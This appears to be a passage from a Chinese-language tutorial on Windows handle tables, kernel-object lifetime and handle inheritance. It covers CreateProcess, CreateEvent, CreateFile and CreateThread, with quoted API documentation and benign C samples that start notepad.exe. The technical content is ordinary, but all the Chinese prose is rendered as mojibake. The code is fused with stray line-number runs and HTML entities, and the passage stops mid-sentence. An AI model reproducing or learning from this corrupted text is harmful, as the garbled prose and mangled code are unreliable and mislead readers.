æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œè¿™ä¸ªå¥æŸ„è¡¨æ˜¯ç§æœ‰çš„ï¼Œç”¨äºå­˜å‚¨å½“å‰è¿›ç¨‹æ‰€æ‹¥æœ‰çš„æ‰€æœ‰å¥æŸ„ã€‚è¿™äº›å¥æŸ„æŒ‡å‘å„ç§èµ„æºï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€çº¿ç¨‹ã€è¿›ç¨‹ç­‰å†…æ ¸å¯¹è±¡ã€‚å¥æŸ„è¡¨ä¸­çš„æ¯ä¸ªå¥æŸ„éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç¼–å·ï¼Œä½†è¿™äº›ç¼–å·åªåœ¨è¯¥è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­æœ‰æ„ä¹‰ã€‚ä¸åŒè¿›ç¨‹çš„å¥æŸ„è¡¨å½¼æ­¤ç‹¬ç«‹ï¼Œå› æ­¤ä¸€ä¸ªå¥æŸ„ç¼–å·åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­å¯èƒ½ä»£è¡¨ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨å¦ä¸€ä¸ªè¿›ç¨‹ä¸­å¯èƒ½ä»£è¡¨ä¸åŒçš„å¯¹è±¡æˆ–æ²¡æœ‰ä»»ä½•æ„ä¹‰ã€‚æ¯”å¦‚æ‹¿Aè¿›ç¨‹å¥æŸ„è¡¨çš„Handleç´¢å¼•å€¼æ¯”å¦‚1ï¼Œåˆ°Bçš„å¥æŸ„è¡¨å»æ‰¾ç¼–å·1å¯¹åº”çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ ä½†æœ‰ä¸€ä¸ªå†…æ ¸å¯¹è±¡æ˜¯ä¾‹å¤–ï¼šçº¿ç¨‹å†…æ ¸å¯¹è±¡ã€‚çº¿ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0åï¼ˆåªæ˜¯è¯´æ˜æ²¡æœ‰ä»»ä½•äººçš„å¥æŸ„æŒ‡å‘äº†è¿™ä¸ªå†…æ ¸å¯¹è±¡ï¼‰ï¼Œå¹¶ä¸ä¼šç»“æŸç›¸å…³è”çš„çº¿ç¨‹ï¼Œä¸ä¼šé‡Šæ”¾çº¿ç¨‹å†…æ ¸å¯¹è±¡ï¼›è¿›ç¨‹å†…æ ¸å¯¹è±¡è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0åï¼Œå¹¶ä¸ä¼šç»“æŸç›¸å…³è”çš„è¿›ç¨‹ï¼Œä¸ä¼šé‡Šæ”¾è¿›ç¨‹å†…æ ¸å¯¹è±¡ã€‚ å¦‚æœæƒ³é‡Šæ”¾ä¸€ä¸ªçº¿ç¨‹å†…æ ¸å¯¹è±¡ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š å…³é—­çº¿ç¨‹ çº¿ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0 å¦‚æœæƒ³é‡Šæ”¾ä¸€ä¸ªè¿›ç¨‹å†…æ ¸å¯¹è±¡ï¼Œéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š å…³é—­è¿›ç¨‹ï¼ˆé€šè¿‡å…³é—­è¿›ç¨‹é‡Œæ‰€æœ‰çº¿ç¨‹æ¥å…³é—­è¿›ç¨‹ï¼‰ è¿›ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0 ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼ˆé€šå¸¸ç§°ä¸ºä¸»çº¿ç¨‹ï¼‰ã€‚å¦‚æœä¸€ä¸ªè¿›ç¨‹æ²¡æœ‰ä»»ä½•æ´»åŠ¨çº¿ç¨‹ï¼Œé‚£ä¹ˆå®ƒé€šå¸¸ä¼šç»“æŸã€‚æ‰€ä»¥å½“ä¸€ä¸ªè¿›ç¨‹é‡Œæ‰€æœ‰çº¿ç¨‹éƒ½ç»“æŸäº†ï¼Œè¿›ç¨‹ä¹Ÿå°±ä¼šç»“æŸã€‚ CloseHandle Closing a thread handle does not terminate the associated thread or remove the thread object. Closing a process handle does not terminate the associated process or remove the process object. To remove a thread object, you must terminate the thread, then close all handles to the thread. For more information, see Terminating a Thread. To remove a process object, you must terminate the process, then close all handles to the process. For more information, see Terminating a Process. ä¾‹ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123; TCHAR childProcessName[] = TEXT(&quot;C:/WINDOWS/system32/notepad.exe&quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); //ç½®0 ZeroMemory(&amp;pi, sizeof(pi)); //ç½®0 si.cb = sizeof(si); //å¡«å……è¯¥æˆå‘˜ï¼Œè®°å½•ç»“æ„ä½“å¤§å° if (CreateProcess( childProcessName, //è¿›ç¨‹åç§° NULL, //å‘½ä»¤è¡Œå‚æ•° NULL, //ä¸ç»§æ‰¿è¿›ç¨‹å¥æŸ„ NULL, //ä¸ç»§æ‰¿çº¿ç¨‹å¥æŸ„ FALSE, //ä¸ç»§æ‰¿å¥æŸ„ 0, //æ²¡æœ‰åˆ›å»ºæ ‡å¿— NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç¯å¢ƒå˜é‡ NULL, //ä½¿ç”¨çˆ¶è¿›ç¨‹ç›®å½•ä½œä¸ºå½“å‰ç›®å½•ï¼Œå¯ä»¥è‡ªå·±è®¾ç½®ç›®å½• &amp;si, //STARTUPINFOWç»“æ„ä½“è¯¦ç»†ä¿¡æ¯ &amp;pi) //PROCESS_INFORMATIONç»“æ„ä½“è¿›ç¨‹ä¿¡æ¯ ) &#123; printf(&quot;CreateProcess Successfully! &quot;); &#125; else &#123; printf(&quot;CreateProcess Error: %d &quot;, GetLastError()); &#125; CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; æ‰§è¡Œä¸Šé¢è¿™æ®µä»£ç ï¼Œä¸€å¼€å§‹è¿™ä¸ªç¨‹åºçš„è¿›ç¨‹å†…æ ¸å¯¹è±¡å’Œçº¿ç¨‹å†…æ ¸å¯¹è±¡åˆ›å»ºååªæœ‰è‡ªå·±ç”¨ï¼Œä¸¤ä¸ªå†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨éƒ½ä¸º1ï¼Œç„¶åæ‰§è¡Œäº†åé¢ä¸¤è¡ŒCloseHandleï¼Œè¿›ç¨‹å†…æ ¸å¯¹è±¡å’Œçº¿ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨éƒ½å‡ä¸º0ã€‚ä»£ç å·²ç»æ‰§è¡Œå®Œäº†ï¼Œå‘ç°è®°äº‹æœ¬ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚å³ä½¿çº¿ç¨‹çš„å†…æ ¸å¯¹è±¡è®¡æ•°å™¨ä¸º0ï¼Œçº¿ç¨‹ä»ä¼šç»§ç»­æ‰§è¡Œï¼Œç›´åˆ°å®ƒè‡ªç„¶ç»“æŸæˆ–è¢«å¼ºåˆ¶ç»ˆæ­¢ï¼›è€Œçº¿ç¨‹æ²¡æ­»ï¼Œè¿›ç¨‹ä¹Ÿä¸ä¼šæ­»ã€‚å¦‚æœæƒ³é‡Šæ”¾æ‰çº¿ç¨‹å†…æ ¸å¯¹è±¡ï¼Œå¿…é¡»å…³æ‰çº¿ç¨‹ï¼ˆå…³é—­è®°äº‹æœ¬ï¼Œç‚¹å‡»å³ä¸Šè§’çš„â€œXâ€ï¼‰ï¼Œå…³æ‰çº¿ç¨‹åçº¿ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¸º0ï¼Œæ­¤æ—¶çº¿ç¨‹å†…æ ¸å¯¹è±¡è¢«é‡Šæ”¾ã€‚åˆå› ä¸ºè¿™ä¸ªè¿›ç¨‹ä¸­æ²¡æœ‰æ´»åŠ¨çº¿ç¨‹äº†ï¼ˆä¸€ä¸ªè¿›ç¨‹åªæœ‰åœ¨æ‰€æœ‰çº¿ç¨‹éƒ½å·²ç»“æŸæ—¶æ‰ä¼šç»“æŸï¼‰ï¼Œè¿›ç¨‹ä¼šç»“æŸï¼ŒåŠ ä¹‹è¿›ç¨‹å†…æ ¸å¯¹è±¡å¼•ç”¨è®¡æ•°å™¨ä¹Ÿä¸º0ï¼Œæ‰€ä»¥è¿›ç¨‹å†…æ ¸å¯¹è±¡è¿™æ—¶æ‰ä¼šé‡Šæ”¾ã€‚ åˆ›å»ºå†…æ ¸å¯¹è±¡æ—¶ï¼Œè®¾ç½®è¯¥å¥æŸ„æ˜¯å¦&quot;å¯ä»¥/å…è®¸&quot;è¢«ç»§æ‰¿ è¿˜æ˜¯ä»¥è¿™å¼ å›¾ä¸ºä¾‹ï¼Œä¸€ä¸ªçˆ¶è¿›ç¨‹ä½¿ç”¨CreateProcessã€CreateThreadã€CreateEventã€CreateFileç­‰å‡½æ•°åˆ›å»ºäº†Aã€Bã€Cã€Dçš„å†…æ ¸å¯¹è±¡ï¼Œå‡è®¾å¯¹åº”çš„ç´¢å¼•å€¼åˆ†åˆ«æ˜¯1-Aï¼Œ2-Bï¼Œ3-Cï¼Œ4-Dã€‚è°ƒç”¨è¿™äº›å‡½æ•°ä¼ å‚æ—¶éƒ½æœ‰ä¸€ä¸ªå«LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ã€‚ è¿™ä¸€ç‚¹å¯ä»¥æ‹¿æ¥åˆ¤æ–­åˆ›å»ºçš„è¿™ä¸ªä¸œè¥¿å¦æ˜¯å†…æ ¸å¯¹è±¡ï¼šCreatexxxå‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¸­å¦‚æœæœ‰LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ï¼Œåˆ™è¿™ä¸ªobjectæ˜¯å†…æ ¸å¯¹è±¡ CreateEventå‡½æ•°ä¸ºä¾‹CreateFileWå‡½æ•°ä¸ºä¾‹CreateThreadå‡½æ•°ä¸ºä¾‹CreateProcesså‡½æ•°ä¸ºä¾‹ä»¥CreateEventå‡½æ•°ä¸ºä¾‹ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ã€‚ 123456HANDLE CreateEventA( [in, optional] LPSECURITY_ATTRIBUTES lpEventAttributes, [in] BOOL bManualReset, [in] BOOL bInitialState, [in, optional] LPCSTR lpName); CreateEventA 1[in, optional] lpEventAttributes A pointer to a SECURITY_ATTRIBUTES structure. If this parameter is NULL, the handle cannot be inherited by child processes. The lpSecurityDescriptor member of the structure specifies a security descriptor for the new event. If lpEventAttributes is NULL, the event gets a default security descriptor. The ACLs in the default security descriptor for an event come from the primary or impersonation token of the creator. ä»¥CreateFileWå‡½æ•°ä¸ºä¾‹ï¼Œå®ƒçš„ç¬¬å››ä¸ªå‚æ•°æ˜¯LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ã€‚ 123456789HANDLE CreateFileW( [in] LPCWSTR lpFileName, [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile); CreateFileW 1[in, optional] lpSecurityAttributes A pointer to a SECURITY_ATTRIBUTES structure that contains two separate but related data members: an optional security descriptor, and a Boolean value that determines whether the returned handle can be inherited by child processes. This parameter can be NULL. If this parameter is NULL, the handle returned by CreateFile cannot be inherited by any child processes the application may create and the file or device associated with the returned handle gets a default security descriptor. The lpSecurityDescriptor member of the structure specifies a SECURITY_DESCRIPTOR for a file or device. If this member is NULL, the file or device associated with the returned handle is assigned a default security descriptor. CreateFile ignores the lpSecurityDescriptor member when opening an existing file or device, but continues to use the bInheritHandle member. The bInheritHandle member of the structure specifies whether the returned handle can be inherited. For more information, see the Remarks section. ä»¥CreateThreadå‡½æ•°ä¸ºä¾‹ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ã€‚ 12345678HANDLE CreateThread( [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in, optional] __drv_aliasesMem LPVOID lpParameter, [in] DWORD dwCreationFlags, [out, optional] LPDWORD lpThreadId); 1[in, optional] lpThreadAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited. The lpSecurityDescriptor member of the structure specifies a security descriptor for the new thread. If lpThreadAttributes is NULL, the thread gets a default security descriptor. The ACLs in the default security descriptor for a thread come from the primary token of the creator. ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªæ´»åŠ¨çº¿ç¨‹ï¼Œæ‰€ä»¥ä½¿ç”¨CreateProcessåˆ›å»ºä¸€ä¸ªè¿›ç¨‹åï¼Œå°±æœ‰äº†ä¸€ä¸ªè¿›ç¨‹å†…æ ¸å¯¹è±¡å’Œä¸€ä¸ªçº¿ç¨‹å†…æ ¸å¯¹è±¡ã€‚ ä»¥CreateProcesså‡½æ•°ä¸ºä¾‹ï¼š ç¬¬3ä¸ªå‚æ•°æ˜¯LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ï¼Œè¡¨ç¤ºCreteProcessåçš„è¿›ç¨‹å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ˜¯å¦&quot;å…è®¸/å¯ä»¥&quot;è¢«ç»§æ‰¿ ç¬¬4ä¸ªå‚æ•°æ˜¯LPSECURITY_ATTRIBUTESç±»å‹çš„å‚æ•°ï¼Œè¡¨ç¤ºCreteProcessåè¿›ç¨‹ä¸­çš„çº¿ç¨‹å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ˜¯å¦&quot;å…è®¸/å¯ä»¥&quot;è¢«ç»§æ‰¿ 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // LPSECURITY_ATTRIBUTES lpProcessAttributes, // è¿›ç¨‹å¥æŸ„æ˜¯å¦å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ LPSECURITY_ATTRIBUTES lpThreadAttributes, // çº¿ç¨‹å¥æŸ„æ˜¯å¦å…è®¸/å¯ä»¥è¢«ç»§æ‰¿ BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // LPPROCESS_INFORMATION lpProcessInformation // ); CreateProcessW function 1[in, optional] lpProcessAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new process object can be inherited by child processes. If lpProcessAttributes is NULL, the handle cannot be inherited. 1[in, optional] lpThreadAttributes A pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle to the new thread object can be inherited by child processes. If lpThreadAttributes is NULL, the handle cannot be inherited. LPSECURITY_ATTRIBUTESæ˜¯ä¸€ä¸ªæŒ‡å‘SECURITY_ATTRIBUTESç»“æ„ä½“çš„æŒ‡é’ˆã€‚ 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; // è¯¥ç»“æ„ä½“å¤§å° LPVOID lpSecurityDescriptor; // æŒ‡å‘SecurityDescriptorç»“æ„ä½“çš„æŒ‡é’ˆ BOOL bInheritHandle; // å¥æŸ„èƒ½å¦è¢«ç»§æ‰¿&#125; SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; nLengthï¼šè®°å½•å½“å‰ç»“æ„ä½“çš„å¤§å°ã€‚å¾ˆå¸¸è§ï¼Œwindowsçš„å¾ˆå¤šç»“æ„ä½“éƒ½æœ‰è¿™ä¹ˆä¸€ä¸ªå­—æ®µ lpSecurityDescriptorï¼šæŒ‡å‘å®‰å…¨æè¿°ç¬¦ï¼ˆSecurityDescriptorç»“æ„ä½“ï¼‰çš„æŒ‡é’ˆã€‚ A security descriptor includes information that specifies the following components of an objectâ€™s security: An owner security identifier (SID) A primary group SID A discretionary access control list (DACL) A system access control list (SACL) Qualifiers for the preceding items ä¸€èˆ¬æƒ…å†µä¸‹ä¸å…³æ³¨è¿™ä¸ªå­—æ®µï¼Œç½®NULLï¼Œé‚£ä¹ˆé‡‡ç”¨çš„å®‰å…¨è®¾ç½®å°±å’Œçˆ¶è¿›ç¨‹ä¸€æ ·ã€‚ï¼ˆIf the value of this member is NULL, the object is assigned the default security descriptor associated with the access token of the calling process.ï¼‰ SECURITY_DESCRIPTOR The SECURITY_DESCRIPTOR structure contains the security information associated with an object. Applications use this structure to set and query an objectâ€™s security status. Because the internal format of a security descriptor can vary, we recommend that applications not modify the SECURITY_DESCRIPTOR structure directly. For creating and manipulating a security descriptor, use the functions listed in See Also. bInheritHandleï¼šå¥æŸ„èƒ½å¦è¢«ç»§æ‰¿ A Boolean value that specifies whether the returned handle is inherited when a new process is created. If this member is TRUE, the new process inherits the handle. è®¾ç½®SECURITY_ATTRIBUTES.bInheritHandleå­—æ®µä¸ºTRUEï¼Œè®¾ç½®è¯¥å¯¹è±¡å¯ä»¥è¢«ç»§æ‰¿ï¼Œç„¶åä¼ å‚ï¼Œé‚£ä¹ˆCreatexxxåˆ›å»ºçš„è¿™ä¸ªå†…æ ¸å¯¹è±¡å°±å¯ä»¥è¢«ç»§æ‰¿ã€‚ å¦å¤–ï¼Œè¿™é‡Œè¦å†æä¸€ä¸‹å¥æŸ„è¡¨ï¼Œå¥æŸ„è¡¨å…¶å®è¿˜æœ‰ä¸€åˆ—ï¼Œç”¨æ¥è¡¨ç¤ºè¿™ä¸ªå¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ã€‚æ¯”å¦‚ çˆ¶è¿›ç¨‹ä½¿ç”¨CreateEventåˆ›å»ºäº†å†…æ ¸å¯¹è±¡Cï¼Œè®¾ç½®å¥æŸ„ä¸å¯ç»§æ‰¿ã€‚é‚£ä¹ˆåœ¨å¥æŸ„è¡¨ä¸­ï¼ŒCå¯¹è±¡å¥æŸ„é‚£ä¸€è¡Œï¼Œæ ‡è¯†è¯¥å¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿çš„å­—æ®µå°±ä¸º0ï¼Œè¡¨ç¤ºä¸å¯ä»¥ç»§æ‰¿ã€‚ çˆ¶è¿›ç¨‹ä½¿ç”¨CreatFileåˆ›å»ºäº†å†…æ ¸å¯¹è±¡Dï¼Œè®¾ç½®å¥æŸ„å¯ä»¥è¢«ç»§æ‰¿ã€‚é‚£ä¹ˆåœ¨å¥æŸ„è¡¨ä¸­ï¼ŒDå¯¹è±¡å¥æŸ„é‚£ä¸€è¡Œï¼Œæ ‡è¯†è¯¥å¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿çš„å­—æ®µå°±ä¸º1ï¼Œè¡¨ç¤ºå¯ä»¥è¢«ç»§æ‰¿ã€‚ ä¾‹ åˆ›å»ºä¸å¯ç»§æ‰¿å’Œå¯ç»§æ‰¿çš„å†…æ ¸å¯¹è±¡ ç›´æ¥ä¼ NULL è®¾ç½®SECURITY_ATTRIBUTES.bInheritHandleå­—æ®µä¸ºTRUEï¼Œè®¾ç½®è¯¥å¯¹è±¡å¯ä»¥è¢«ç»§æ‰¿ï¼Œç„¶åä¼ å‚ CreateEventCreateFileCreateThreadCreateProcessä¸å¯ç»§æ‰¿å¯ç»§æ‰¿1234567// åˆ›å»ºä¸€ä¸ªä¸å¯ç»§æ‰¿çš„äº‹ä»¶å¯¹è±¡ HANDLE hEvent = CreateEvent( NULL, // lpEventAttributes è®¾ç½®ä¸º NULLï¼Œè¡¨ç¤ºäº‹ä»¶å¯¹è±¡ä¸å¯è¢«ç»§æ‰¿ FALSE, FALSE, NULL );123456789101112131415// åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ç»“æ„ SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // é»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„ sa.bInheritHandle = TRUE; // è®¾ç½® bInheritHandle ä¸º TRUEï¼Œè¡¨ç¤ºäº‹ä»¶å¯¹è±¡å¯ä»¥è¢«ç»§æ‰¿ // åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„äº‹ä»¶å¯¹è±¡ HANDLE hEvent = CreateEvent( &amp;sa, // ä½¿ç”¨ä¸Šé¢è®¾ç½®çš„å¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ FALSE, FALSE, NULL );ä¸å¯ç»§æ‰¿å¯ç»§æ‰¿12345678910// æ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶ï¼Œä¸å…è®¸ç»§æ‰¿ HANDLE hFile = CreateFile( TEXT(&quot;example.txt&quot;), GENERIC_READ, 0, NULL, // å®‰å…¨å±æ€§è®¾ç½®ä¸ºNULLï¼Œæ–‡ä»¶å¥æŸ„ä¸å¯ç»§æ‰¿ OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );123456789101112131415161718// åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ç»“æ„ SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // é»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„ sa.bInheritHandle = TRUE; // è®¾ç½®bInheritHandleä¸ºTRUEï¼Œæ–‡ä»¶å¥æŸ„å¯ç»§æ‰¿ // æ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶ï¼Œå…è®¸ç»§æ‰¿ HANDLE hFile = CreateFile( TEXT(&quot;example.txt&quot;), GENERIC_READ, 0, &amp;sa, // ä½¿ç”¨å¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );ä¸å¯ç»§æ‰¿å¯ç»§æ‰¿123456789101112131415161718192021DWORD WINAPI ThreadFunc(LPVOID lpParam) &#123; // çº¿ç¨‹æ‰§è¡Œä»£ç  return 0;&#125;int main&#123; HANDLE hThread; DWORD ThreadId; // åˆ›å»ºä¸€ä¸ªä¸å¯ç»§æ‰¿çš„çº¿ç¨‹ hThread = CreateThread( NULL, // lpThreadAttributes è®¾ç½®ä¸º NULLï¼Œçº¿ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿ 0, ThreadFunc, // çº¿ç¨‹å‡½æ•° NULL, 0, &amp;ThreadId // è¿”å›çº¿ç¨‹çš„ID ); //å…¶ä»–ç»†èŠ‚ç•¥&#125;12345678910111213141516171819202122232425262728293031#include &lt;Windows.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam) &#123; // çº¿ç¨‹æ‰§è¡Œä»£ç  return 0;&#125;int main&#123; HANDLE hThread; DWORD ThreadId; // åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ç»“æ„ SECURITY_ATTRIBUTES sa; ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES)); sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = NULL; // é»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„ sa.bInheritHandle = TRUE; // è®¾ç½® bInheritHandle ä¸º TRUEï¼Œçº¿ç¨‹å¥æŸ„å¯ç»§æ‰¿ // åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„çº¿ç¨‹ hThread = CreateThread( &amp;sa, // ä½¿ç”¨å¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ 0, ThreadFunc, // çº¿ç¨‹å‡½æ•° NULL, 0, &amp;ThreadId // è¿”å›çº¿ç¨‹çš„ID ); //å…¶ä»–ç»†èŠ‚ç•¥&#125;ä¸å¯ç»§æ‰¿å¯ç»§æ‰¿éƒ½å¡«NULLçš„è¯ï¼Œè¡¨ç¤ºè¿™ä¸ªè¿›ç¨‹çš„è¿›ç¨‹å¥æŸ„å’Œçº¿ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿ 12345678910111213141516171819STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&amp;si, sizeof(si));si.cb = sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));// åˆ›å»ºä¸€ä¸ªä¸å¯ç»§æ‰¿çš„è¿›ç¨‹CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), NULL, NULL, // lpProcessAttributesè®¾ç½®ä¸ºNULLï¼Œè¿›ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿ NULL, // lpThreadAttributesè®¾ç½®ä¸ºNULLï¼Œçº¿ç¨‹å¥æŸ„ä¸å¯ç»§æ‰¿ FALSE, // 0, // NULL, // NULL, // &amp;si, // &amp;pi // );1234567891011121314151617181920212223242526STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&amp;si, sizeof(si));si.cb = sizeof(si);ZeroMemory(&amp;pi, sizeof(pi));// åˆ›å»ºä¸€ä¸ªå¯ç»§æ‰¿çš„å®‰å…¨å±æ€§ç»“æ„SECURITY_ATTRIBUTES sa;ZeroMemory (&amp;sa,sizeof(SECURITY_ATTRIBUTES));sa.nLength = sizeof(SECURITY_ATTRIBUTES);sa.lpSecurityDescriptor = NULL; // é»˜è®¤ä½¿ç”¨çˆ¶ç±»çš„sa.bInheritHandle = TRUE; // è®¾ç½®bInheritHandleä¸ºTRUEï¼Œä½¿å¥æŸ„å¯ç»§æ‰¿// åˆ›å»ºä¸€ä¸ªè¿›ç¨‹å¥æŸ„å’Œçº¿ç¨‹å¥æŸ„å¯ç»§æ‰¿çš„è¿›ç¨‹CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), NULL, &amp;sa, // è®¾ç½® bInheritHandle ä¸º TRUEï¼Œè¿›ç¨‹å¥æŸ„å¯ç»§æ‰¿ &amp;sa, // è®¾ç½® bInheritHandle ä¸º TRUEï¼Œçº¿ç¨‹å¥æŸ„å¯ç»§æ‰¿ FALSE, // 0, // NULL, // NULL, // &amp;si, // &amp;pi // ); çˆ¶è¿›ç¨‹å¥æŸ„æ˜¯å¦è¢«å­è¿›ç¨‹ç»§æ‰¿ ä¸Šé¢ä¸€å°èŠ‚è¯´çš„æ˜¯çˆ¶è¿›ç¨‹ä¸­åˆ›å»ºå†…æ ¸å¯¹è±¡æ—¶è¡¨ç¤ºè¿™ä¸ªå¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ã€‚ç°åœ¨è¿™ä¸€å°èŠ‚è¯´çš„æ˜¯å­è¿›ç¨‹æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¥æŸ„è¡¨ã€‚ CreateProcessçš„ç¬¬äº”ä¸ªå‚æ•°bInheritHandleså°±æ˜¯ç”¨æ¥è¡¨ç¤ºåˆ›å»ºçš„è¿™ä¸ªå­è¿›ç¨‹æ˜¯å¦ç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¥æŸ„è¡¨çš„å†…å®¹ã€‚ å¦‚æœç»§æ‰¿ï¼Œå­è¿›ç¨‹å°†ä¼šå¾—åˆ°çˆ¶è¿›ç¨‹å¥æŸ„è¡¨çš„å†…å®¹ï¼ˆä½†ä¸æ˜¯å®Œå…¨å¾—åˆ°ï¼Œåé¢ä¼šè¯´ï¼‰ å¦‚æœä¸ç»§æ‰¿ï¼Œçˆ¶è¿›ç¨‹çš„å¥æŸ„è¡¨å’Œå­è¿›ç¨‹å°±æ²¡å…³ç³»å‘— 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // LPWSTR lpCommandLine, // LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // æ˜¯å¦ç»§æ‰¿å¥æŸ„ DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // LPPROCESS_INFORMATION lpProcessInformation // ); CreateProcessW function 1[in] bInheritHandles If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process. If the parameter is FALSE, the handles are not inherited. Note that inherited handles have the same value and access rights as the original handles. For additional discussion of inheritable handles, see Remarks. Terminal Services: You cannot inherit handles across sessions. Additionally, if this parameter is TRUE, you must create the process in the same session as the caller. Protected Process Light (PPL) processes: The generic handle inheritance is blocked when a PPL process creates a non-PPL process since PROCESS_DUP_HANDLE is not allowed from a non-PPL process to a PPL process. See Process Security and Access Rights ä½†è¯·æ³¨æ„ï¼Œå¦‚æœåˆ›å»ºå­è¿›ç¨‹æ—¶é€‰æ‹©ç»§æ‰¿ï¼Œå­è¿›ç¨‹åªä¼šç»§æ‰¿çˆ¶è¿›ç¨‹ä¸­å¯ç»§æ‰¿çš„å¥æŸ„ï¼ˆinheritable 